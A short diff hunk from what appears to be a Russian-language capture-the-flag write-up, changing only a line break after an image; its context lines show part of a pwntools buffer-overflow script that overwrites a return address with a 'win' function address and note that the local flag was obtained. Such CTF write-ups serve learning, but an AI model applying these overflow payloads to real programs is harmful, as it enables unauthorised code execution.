@@ -23,7 +23,7 @@ win_addr = 0x401172
 p.sendline(b"AAAAAAAA" + p64(win_addr))
 p.interactive()
 ```
-![image](https://github.com/user-attachments/assets/3c1fb947-80b9-4342-8877-bdba66f5c8e5)
+![image](https://github.com/user-attachments/assets/3c1fb947-80b9-4342-8877-bdba66f5c8e5) <br />
 Получить локальный флаг удалось, теперь получим настоящий флаг: <br>
 ```py
 from pwn import *
